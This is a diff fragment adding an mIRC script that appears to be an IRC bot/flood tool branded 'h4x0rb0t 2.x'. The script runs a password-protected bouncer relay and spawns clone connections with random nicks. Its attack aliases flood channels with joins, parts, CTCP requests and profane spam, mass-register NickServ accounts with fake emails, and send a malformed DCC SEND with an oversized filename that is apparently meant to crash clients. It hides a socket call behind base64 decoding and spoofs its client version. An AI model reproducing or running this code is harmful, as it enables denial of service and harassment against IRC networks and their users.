+    sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)
+    sockwrite -n $sockname NOTICE AUTH : $+ Making reality through $gettok(%BncClient,2,32) port $gettok(%BncClient,3,32)
+    set %Bnc.server.passwd $gettok(%BncClient,4,32)
+  }
+  else {
+    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {
+      halt
+    }
+    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient
+  }
+}
+on *:sockopen:BncServer*:{
+  if ($sockerr) {
+    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection
+    sockclose $sockname
+    halt
+  }
+  if ($sock($sockname).status != active) {
+    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection
+    sockclose BncServer $+ $remove($socknme, BncServer)
+    halt
+  }
+  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ Suceeded connection
+  sockwrite -n $sockname NICK %Bnc.nick
+  sockwrite -n $sockname USER %Bnc.user
+}
+on *:sockread:BncServer*:{
+  sockread %BncServer
+  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {
+    halt
+  }
+  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer
+}
+on *:sockopen:Sockets-*:{ sockwrite -tn $sockname PONG $server | sockwrite -tn $sockname USER $nfs $nfs $nfs : $+ $nfs |   sockwrite -tn $sockname NICK $read(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) }
+on *:sockread:Sockets-*:{
+  sockread %SocketTemp
+  if (PING* ISWM %SocketTemp) {
+    sockwrite -tn $sockname PONG : $+ $gettok(%SocketTemp,2,58)
+    halt
+  }
+  halt
+}
+on *:sockopen:user.*:{ 
+  if ($sockerr > 0) { return }  
+  sockwrite -n $sockname USER $user.c * * : $+ $user.c 
+  sockwrite -n $sockname NICK $user.c
+  sockwrite -n $sockname AWAY : $+ $away.c
+}
+on *:SoCkReAd:UsEr.*:{
+  sockread %owned
+  tokenize 32 %owned
+  if ($1 = PING) { sockwrite -n $sockname PONG $2- }
+  if ($1 = ERROR) { sockclose $sockname | connect.c %server.c %port.c }
+  if ($2 = 432) { sockwrite -n $sockname NICK $user.c }
+  if ($2 = KICK) { sockwrite -n $sockname JOIN : $+ $gettok(%owned,3,32) }
+  if ($2 = 433) { sockwrite -n $sockname NICK $user.c }
+  if ($2 = PRIVMSG) && (:Version = $4) { sockwrite -n $sockname NOTICE $remove($gettok($1,1,33),:,$chr(32)) :VERSION mIRC 6.14 Khaled Mardam-Bey  }
+  if ($2 = PRIVMSG) && (:PING* iswm $4-) { sockwrite -n $sockname NOTICE $remove($gettok($1,1,33),:,$chr(32)) :PING $ctime $+  }
+  if ($2 = PRIVMSG) && (:Time iswm $4-) { sockwrite -n $sockname NOTICE $remove($gettok($1,1,33),:,$chr(32)) :TIME $fulldate $+  }
+}
+alias connect.c { $decode(c29ja29wZW4=,m) $+(user,.,$r(0,9999999)) $1- }
+alias user { sockwrite -n user.* $$1- }
+alias user.c return $rand.c
+alias away.c return $read(4w4y.txt,$r(0,38))
+alias rand.c return $+($r(A,Z),$r(1,99),$r(1,99),$r(A,Z),$r(A,Z),$r(A,Z),$r(A,Z))
+alias rand.p.c return $+($r(A,Z),$r(1,99),$r(1,99),$r(A,Z),$r(A,Z),$r(1,99),$r(1,99),$r(A,Z))
+alias chat.c { sockwrite -n user.* PRIVMSG $1 :DCC CHAT chat 0 0 }
+alias send.c { sockwrite -n user.* PRIVMSG $1 :DCC SEND $replace($2-,$chr(32),_) 0 0 0 }
+alias dcc.c { sockwrite -n user.* PRIVMSG $1 $+(:,$chr(1),DCC) send " $+ $str($rand(a,z) $+ $chr(32),250) $+ " 0 2130706433 $+(8192,$chr(1)) }
+alias jp.c { sockwrite -n user.* IRCX | user JOIN %jp.chan.c | user PART %jp.chan.c | user JOIN %jp.chan.c | user PART %jp.chan.c | user JOIN %jp.chan.c | user PART %jp.chan.c | user JOIN %jp.chan.c | user PART %jp.chan.c | user JOIN %jp.chan.c | user PART %jp.chan.c | user JOIN %jp.chan.c | user PART %jp.chan.c | user JOIN %jp.chan.c | user PART %jp.chan.c | user JOIN %jp.chan.c | user PART %jp.chan.c | user JOIN %jp.chan.c | user PART %jp.chan.c }
+alias fuck.c { sockwrite -n user.* IRCX | user JOIN %fuck.chan.c | user PART %fuck.chan.c FUCK | user JOIN %fuck.chan.c | user PRIVMSG %fuck.chan.c FUCK | user NOTICE %fuck.chan.c FUCK | user PART %fuck.chan.c FUCK | user JOIN %fuck.chan.c | user PART %fuck.chan.c FUCK | user JOIN %fuck.chan.c | user PRIVMSG %fuck.chan.c FUCK | user NOTICE %fuck.chan.c FUCK }
+alias ns.c { user PRIVMSG Nickserv : register $rand.p.c $+(h4ckxcr3w@,$rand.p.c,.com) | timerregn 1 4 user nick $rand.c | timerregd 1 6 user PRIVMSG Nickserv : register $rand.p.c $+(h4ckxcr3w@,$rand.p.c,.com) }
+alias ctcp.c { sockwrite -n user.* IRCX | user join %flood.ctcp.c | user PRIVMSG %flood.ctcp.c PING | user PRIVMSG %flood.ctcp.c VERSION | user PRIVMSG %flood.ctcp.c TIME | user PRIVMSG %flood.ctcp.c PING | user PRIVMSG %flood.ctcp.c VERSION | user PRIVMSG %flood.ctcp.c TIME | user PRIVMSG %flood.ctcp.c PING | user PRIVMSG %flood.ctcp.c VERSION | user PRIVMSG %flood.ctcp.c TIME | user PRIVMSG %flood.ctcp.c PING | user PRIVMSG %flood.ctcp.c VERSION | user PRIVMSG %flood.ctcp.c TIME | user PRIVMSG %flood.ctcp.c PING | user PRIVMSG %flood.ctcp.c VERSION | user PRIVMSG %flood.ctcp.c TIME }
+alias checkconn {
+  if ($server == $null) { server %server }
+  else { halt }
+}
+on *:SOCKOPEN:CHASE*:{ if $sockerr { return } | %|temp = $+($r(A,Z),$r(1,9999),$r(A,Z),$r(1,99999)) | sockwrite -n $sockname USER %|temp * * : $+ %|temp | sockwrite -n $sockname NICK %|temp }
+on *:SOCKREAD:CHASE*:{
+  sockread %chase
+  tokenize 32 %chase
+  if ($1 = PING) { sockwrite -n $sockname PONG $2- }
+  if ($2 = 432) { .timerX $+ $sockname 1 1 chasenick $sockname }
+  if ($2 = 601) { sockwrite -n $sockname NICK $4 }
+  if ($2 = 605) { sockwrite -n $sockname NICK $4 }
+  if ($2 = 376) { sockwrite -n $sockname MODE $3 +iR | sockwrite -n $sockname WATCH $+(+,%chase.nick) }
+  if ($1 = ERROR) { %sockname = $sockname | %c.ip = $sock($sockname).ip | %c.port = $sock($sockname).port | sockclose $sockname | sockopen %sockname %c.ip %c.port } 
+  if ($2 = NICK) && (%chase.nick = $remove($3,:)) { sockwrite -n $sockname NICKSERV register %chase.pass %chase.mail }
+  if ($4 = 440) { .timerX $+ $sockname 1 1 chasenick }
+}
+on *:sockopen:BncServer*:{ if ($sockerr) { sockwrite -n $sockname NOTICE AUTH : $+ failed connection | sockclose $sockname | halt } | if ($sock($sockname).status != active) { sockwrite -n $sockname NOTICE AUTH : $+ failed connection | sockclose BncServer $+ $remove($socknme, BncServer) | halt } | sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ suceeded connection | sockwrite -n $sockname NICK %Bnc.nick | sockwrite -n $sockname USER %Bnc.user }
+on *:sockread:BncServer*:{ sockread %BncServer | if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) { halt } | sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer }
+on *:socklisten:Bnc:{ sockaccept BncClient $+ $r(1,999) }
+on *:sockread:BncClient*:{
+  sockread %BncClient
+  if ($gettok(%BncClient,1,32) == NICK) { set %Bnc.nick $gettok(%BncClient,2,32) }
+  if ($gettok(%BncClient,1,32) == USER) { set %Bnc.user $gettok(%BncClient,2-,32) | sockwrite -n $sockname NOTICE AUTH : $+ you need to say /quote pass <password> }
+  if ($gettok(%BncClient,1,32) == PASS) { if ($gettok(%BncClient,2,32) == %Bnc.passwd) { sockwrite -n $sockname NOTICE AUTH : $+ welcome to 14[h4x0rb0t 2.x] Bnc System | sockwrite -n $sockname NOTICE AUTH : $+ step two, connect to something.. | sockwrite -n $sockname NOTICE AUTH : $+ type /quote conn <server> <port> <pass> to connect (most irc's dont use pass) | %Bnc.legit = yes } | if ($gettok(%BncClient,2,32) != %Bnc.passwd) { sockwrite -n $sockname NOTICE AUTH : $+ wrong pass asshole! } }
+  if ($gettok(%BncClient,1,32) == CONN) { if (%Bnc.legit != yes) { sockwrite -n $sockname NOTICE AUTH : $+ bnc exploits do not work on h4x0rb0t 2.x | sockclose $sockname } | if (BncServer $+ $remove($sockname,BncClient) != $null) { sockclose BncServer $+ $remove($sockname,BncClient) } | sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32) | sockwrite -n $sockname NOTICE AUTH : $+ connecting to $gettok(%BncClient,2,32) $+ : $+ $gettok(%BncClient,3,32) | set %Bnc.server.passwd $gettok(%BncClient,4,32) } | else { if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) { halt } | sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient } 
+}
